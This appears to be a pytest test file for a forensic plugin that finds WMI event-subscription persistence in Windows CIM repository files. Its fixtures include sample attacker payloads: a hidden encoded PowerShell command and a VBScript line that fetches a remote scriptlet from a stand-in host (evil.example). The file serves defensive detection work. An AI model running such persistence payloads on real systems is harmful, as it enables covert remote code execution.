"""Tests for the WMI event subscription check's instance-record anchors."""

from __future__ import annotations

import hashlib
import struct
from pathlib import Path
from typing import TYPE_CHECKING

import pytest
from pyrsistencesniper.core.ledger import artifact_failures
from pyrsistencesniper.core.models import AccessLevel
from pyrsistencesniper.plugins.T1546.wmi_subscriptions import (
    _HEADER_SEARCH,
    _MAX_HEAP_BYTES,
    _MAX_PAYLOAD,
    _MAX_RECORDS,
    _OVERLAP_BYTES,
    _WINDOW_BYTES,
    WmiEventSubscription,
)

from .conftest import make_deps

if TYPE_CHECKING:
    from typing import BinaryIO


_REPOSITORY = ("Windows", "System32", "wbem", "Repository")

_CLASS_DEFINITION = (
    b"\x00__EventConsumer\x00"
    b"ActiveScriptEventConsumer\x00\x00locale\x00\x00KillTimeout\x00"
    b"CommandLineTemplate\x00\x00string\x00\x00Description\x00"
    b"Command line string\x00\x00CreateNewConsole\x00"
    b"ScriptText\x00\x00string\x00\x00CIMTYPE\x00\x00ToSubclass\x00"
    b"Results are undefined if both properties are assigned values.\x00"
)


def _instance_record(class_name: str, values: list[str]) -> bytes:
    """Build an instance record: hashed class header, then a heap of values."""
    digest = hashlib.sha256(class_name.upper().encode("utf-16-le")).hexdigest().upper()
    heap = b"\x00" + class_name.encode("ascii") + b"\x00"
    heap += b"\x00\x00".join(value.encode("ascii") for value in values)
    return digest.encode("utf-16-le") + b"\x00" * 32 + heap + b"\x00\x00"


_HEAP_LENGTH_FLAG = 0x8000_0000

_LONG_PAYLOAD = "powershell.exe -nop -w hidden -enc " + "QQBB" * 90


def _windows_instance_record(
    class_name: str, values: list[str], declared_length: int | None = None
) -> bytes:
    """Build the record shape Windows writes, whose heap opens with its own length."""
    digest = hashlib.sha256(class_name.upper().encode("utf-16-le")).hexdigest().upper()
    heap = b"".join(
        b"\x00" + text.encode("ascii") + b"\x00" for text in [class_name, *values]
    )
    length = len(heap) if declared_length is None else declared_length
    return (
        digest.encode("utf-16-le")
        + b"\x00" * 28
        + struct.pack("<I", _HEAP_LENGTH_FLAG | length)
        + heap
    )


def _binding_record(class_name: str, instance: str, filter_name: str) -> bytes:
    """Build a filter-to-consumer binding naming both sides by object path."""
    return (
        b"\x00"
        + f'{class_name}.Name="{instance}"'.encode("ascii")
        + b"\x00\x00"
        + f'__EventFilter.Name="{filter_name}"'.encode("ascii")
        + b"\x00"
    )


def _plugin_with(
    tmp_path: Path, blob: bytes, *, fs_variant: bool = False
) -> WmiEventSubscription:
    """Write blob as OBJECTS.DATA under tmp_path and return a plugin bound to it."""
    parts = (*_REPOSITORY, "FS") if fs_variant else _REPOSITORY
    repository = tmp_path.joinpath(*parts)
    repository.mkdir(parents=True)
    (repository / "OBJECTS.DATA").write_bytes(blob)
    context, _registry, _filesystem = make_deps(tmp_path)
    return WmiEventSubscription(context=context)


# Windows ships this class definition on every machine, so CommandLineTemplate
# and ScriptText beside their CIMTYPE token are not evidence of an instance.
def test_class_definition_alone_yields_nothing(tmp_path: Path) -> None:
    """Schema text carrying the consumer property names is not a subscription."""
    plugin = _plugin_with(tmp_path, b"\x00" * 200 + _CLASS_DEFINITION + b"\x00" * 200)
    assert plugin.run() == []


def test_binding_names_the_consumer(tmp_path: Path) -> None:
    """A binding's object path is enough to report the consumer and its filter."""
    blob = b"\x00" * 64 + _binding_record(
        "CommandLineEventConsumer", "Evil", "EvilFilter"
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert 'CommandLineEventConsumer "Evil"' in findings[0].value
    assert 'bound to filter "EvilFilter"' in findings[0].value
    assert findings[0].access_gained == AccessLevel.SYSTEM


def test_binding_gains_payload_from_matching_instance(tmp_path: Path) -> None:
    """The payload is read from the heap of the instance the binding names."""
    command = "powershell.exe -nop -w hidden -enc AAAA"
    blob = (
        _instance_record("CommandLineEventConsumer", [command, "Evil"])
        + b"\x00" * 64
        + _binding_record("CommandLineEventConsumer", "Evil", "EvilFilter")
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert command in findings[0].value


def test_payload_is_not_assumed_to_be_the_first_value(tmp_path: Path) -> None:
    """Heap order differs per class, so the named instance is matched, not indexed."""
    script = 'GetObject("script:http://evil.example/payload.sct")'
    blob = (
        _instance_record("ActiveScriptEventConsumer", ["Evil", "VBScript", script])
        + b"\x00" * 64
        + _binding_record("ActiveScriptEventConsumer", "Evil", "EvilFilter")
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert script in findings[0].value


def test_unbound_instance_is_still_reported(tmp_path: Path) -> None:
    """A consumer whose binding was deleted survives as an uncompacted record."""
    blob = _instance_record("CommandLineEventConsumer", ["cmd.exe /c whoami", "Orphan"])
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "CommandLineEventConsumer instance" in findings[0].value
    assert "Orphan" in findings[0].value
    assert "cmd.exe /c whoami" in findings[0].value


def test_heap_read_stops_at_the_next_record(tmp_path: Path) -> None:
    """A neighbouring filter's query is not attributed to the consumer."""
    blob = _instance_record("CommandLineEventConsumer", ["calc.exe", "Evil"]) + (
        b"\x00__EventFilter\x00root\\cimv2\x00\x00"
        b"SELECT * FROM __InstanceModificationEvent\x00"
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "InstanceModificationEvent" not in findings[0].value


def test_fs_variant_path_is_scanned(tmp_path: Path) -> None:
    """The Repository/FS layout is read when the flat layout is absent."""
    blob = _binding_record("CommandLineEventConsumer", "Evil", "EvilFilter")
    findings = _plugin_with(tmp_path, blob, fs_variant=True).run()

    assert len(findings) == 1


def test_missing_repository_yields_nothing(tmp_path: Path) -> None:
    """An image without a CIM repository produces no findings."""
    context, _registry, _filesystem = make_deps(tmp_path)
    assert WmiEventSubscription(context=context).run() == []


def test_duplicate_bindings_report_once(tmp_path: Path) -> None:
    """An uncompacted repository keeps stale copies, which are not new hits."""
    binding = _binding_record("CommandLineEventConsumer", "Evil", "EvilFilter")
    findings = _plugin_with(tmp_path, binding + b"\x00" * 32 + binding).run()

    assert len(findings) == 1


def _at_offset(offset: int, record: bytes, trailing: int) -> bytes:
    """Place a record at an absolute offset in an otherwise empty repository."""
    return b"\x00" * offset + record + b"\x00" * trailing


def test_record_straddling_a_window_boundary_is_reported(tmp_path: Path) -> None:
    """A consumer written across the read boundary is still read as one record."""
    record = _instance_record("CommandLineEventConsumer", ["cmd.exe /c evil", "Evil"])
    blob = _at_offset(_WINDOW_BYTES - 60, record, _WINDOW_BYTES)
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "Evil" in findings[0].value
    assert "cmd.exe /c evil" in findings[0].value


def test_binding_split_across_windows_keeps_its_filter(tmp_path: Path) -> None:
    """The filter named after the boundary still reaches the consumer beside it."""
    record = _binding_record("CommandLineEventConsumer", "Evil", "EvilFilter")
    blob = _at_offset(_WINDOW_BYTES - 20, record, _WINDOW_BYTES)
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert 'bound to filter "EvilFilter"' in findings[0].value


def test_record_beyond_the_first_window_is_reported(tmp_path: Path) -> None:
    """A repository larger than one read still gets scanned to its end."""
    record = _instance_record("ActiveScriptEventConsumer", ["Evil", "payload.sct"])
    blob = _at_offset(2 * _WINDOW_BYTES + 1000, record, 4096)
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "payload.sct" in findings[0].value


def test_record_inside_the_window_overlap_is_reported_once(tmp_path: Path) -> None:
    """A record seen by two consecutive reads is not reported twice."""
    record = _instance_record("CommandLineEventConsumer", ["cmd.exe /c evil", "Evil"])
    blob = _at_offset(_WINDOW_BYTES - _OVERLAP_BYTES // 2, record, _WINDOW_BYTES)
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1


def test_class_definition_across_windows_stays_quiet(tmp_path: Path) -> None:
    """Reading in windows must not invent a consumer at the seam between them."""
    blob = _at_offset(_WINDOW_BYTES - 40, _CLASS_DEFINITION, _WINDOW_BYTES)
    assert _plugin_with(tmp_path, blob).run() == []


def test_long_payload_keeps_the_instance_name(tmp_path: Path) -> None:
    """A command line past the old read window must not cost the record its name."""
    assert len(_LONG_PAYLOAD) == 395
    blob = (
        _windows_instance_record(
            "CommandLineEventConsumer", [_LONG_PAYLOAD, "LongPayloadConsumer"]
        )
        + b"\x00" * 64
        + _binding_record(
            "CommandLineEventConsumer", "LongPayloadConsumer", "LongPayloadFilter"
        )
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert 'CommandLineEventConsumer "LongPayloadConsumer"' in findings[0].value
    assert 'bound to filter "LongPayloadFilter"' in findings[0].value
    assert _LONG_PAYLOAD[:_MAX_PAYLOAD] in findings[0].value


def test_long_payload_without_a_declared_length_keeps_the_name(tmp_path: Path) -> None:
    """A carved record stating no heap length is still read past a long command line."""
    blob = _instance_record(
        "CommandLineEventConsumer", [_LONG_PAYLOAD, "CarvedConsumer"]
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "CarvedConsumer" in findings[0].value


def test_a_class_hash_without_a_heap_yields_nothing(tmp_path: Path) -> None:
    """A hashed class name with no instance heap behind it is not a subscription."""
    digest = (
        hashlib.sha256("CommandLineEventConsumer".upper().encode("utf-16-le"))
        .hexdigest()
        .upper()
    )
    blob = digest.encode("utf-16-le") + b"\x00" * 2048

    assert _plugin_with(tmp_path, blob).run() == []


def test_a_crowded_heap_reads_a_bounded_number_of_values(tmp_path: Path) -> None:
    """One record may not contribute values without limit to its description."""
    blob = _windows_instance_record(
        "CommandLineEventConsumer", [f"value{index}" for index in range(20)]
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "value5" in findings[0].value
    assert "value19" not in findings[0].value


def test_unbound_long_payload_instance_still_names_itself(tmp_path: Path) -> None:
    """A long value must not starve the name out of the rendered instance."""
    blob = _windows_instance_record(
        "CommandLineEventConsumer", [_LONG_PAYLOAD, "OrphanedLongConsumer"]
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "OrphanedLongConsumer" in findings[0].value
    assert _LONG_PAYLOAD[:_MAX_PAYLOAD] in findings[0].value


def test_each_instance_value_stays_capped_in_the_description(tmp_path: Path) -> None:
    """Rendering every value must not let one record grow without bound."""
    blob = _windows_instance_record(
        "CommandLineEventConsumer", [_LONG_PAYLOAD, _LONG_PAYLOAD, "Capped"]
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert _LONG_PAYLOAD not in findings[0].value
    assert "Capped" in findings[0].value


def test_long_payload_across_a_window_boundary_keeps_its_name(tmp_path: Path) -> None:
    """A long consumer written across the read boundary is still read as one record."""
    record = _windows_instance_record(
        "CommandLineEventConsumer", [_LONG_PAYLOAD, "StraddlingConsumer"]
    )
    blob = _at_offset(_WINDOW_BYTES - 200, record, _WINDOW_BYTES)
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "StraddlingConsumer" in findings[0].value


def test_declared_heap_length_stops_at_the_record_end(tmp_path: Path) -> None:
    """The length the record declares keeps a neighbour's values out of the finding."""
    blob = (
        _windows_instance_record("CommandLineEventConsumer", ["calc.exe", "Benign"])
        + b"\x00SomeOtherRecordValue\x00"
        + b"\x00root\\cimv2\x00"
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "SomeOtherRecordValue" not in findings[0].value
    assert "cimv2" not in findings[0].value


def test_implausible_declared_length_does_not_truncate_the_read(tmp_path: Path) -> None:
    """A high bit in unrelated bytes must not shrink the heap below its class name."""
    blob = _windows_instance_record(
        "CommandLineEventConsumer", ["cmd.exe /c evil", "Evil"], declared_length=1
    )
    findings = _plugin_with(tmp_path, blob).run()

    assert len(findings) == 1
    assert "cmd.exe /c evil" in findings[0].value
    assert "Evil" in findings[0].value


def test_heap_read_cannot_outrun_the_window_overlap() -> None:
    """A straddling record is whole in the next window only if its heap fits it."""
    assert _MAX_HEAP_BYTES + _HEADER_SEARCH <= _OVERLAP_BYTES


class _WatchedHandle:
    """A binary handle that records the size of every read the scan asks for."""

    def __init__(self, handle: BinaryIO, sizes: list[int]) -> None:
        """Wrap a real handle, recording the size of every read into sizes."""
        self._handle = handle
        self._sizes = sizes

    def read(self, size: int = -1) -> bytes:
        """Record the requested size and return the bytes the real handle gives."""
        self._sizes.append(size)
        return self._handle.read(size)

    def __enter__(self) -> _WatchedHandle:
        """Enter the context, standing in for the real file handle."""
        return self

    def __exit__(self, *exc_info: object) -> None:
        """Close the real file handle."""
        self._handle.close()


def test_the_whole_repository_is_never_read_at_once(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Peak memory must not scale with the repository, however large it is."""
    plugin = _plugin_with(tmp_path, b"\x00" * (2 * _WINDOW_BYTES + 1000))
    sizes: list[int] = []
    real_open = Path.open

    def watched(self: Path, *args: object, **kwargs: object) -> _WatchedHandle:
        """Open the file for real, wrapped so every read size is recorded."""
        return _WatchedHandle(real_open(self, *args, **kwargs), sizes)

    monkeypatch.setattr(Path, "open", watched)
    plugin.run()

    assert sizes
    assert all(0 < size <= _WINDOW_BYTES for size in sizes)


def test_unreadable_repository_is_reported_as_lost_coverage(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A repository that exists but will not open is named, never silently skipped."""
    plugin = _plugin_with(tmp_path, b"\x00" * 4096)

    def refuse(self: Path, *args: object, **kwargs: object) -> None:
        """Deny every open, as a repository held open by another reader would."""
        raise PermissionError(13, "Access is denied")

    monkeypatch.setattr(Path, "open", refuse)

    assert plugin.run() == []
    (failure,) = artifact_failures()
    assert failure.label.startswith("wmi_event_subscription artifact ")
    assert "OBJECTS.DATA" in failure.label
    assert "PermissionError" in failure.error


def test_record_flood_stops_the_scan_and_says_so(tmp_path: Path) -> None:
    """The one remaining bound reports itself instead of truncating in silence."""
    flood = b"".join(
        _binding_record("CommandLineEventConsumer", f"Evil{index}", "EvilFilter")
        for index in range(_MAX_RECORDS + 5)
    )
    findings = _plugin_with(tmp_path, flood).run()

    assert len(findings) >= _MAX_RECORDS
    (failure,) = artifact_failures()
    assert failure.label.startswith("wmi_event_subscription artifact ")
    assert "OBJECTS.DATA" in failure.label
    assert str(_MAX_RECORDS) in failure.error
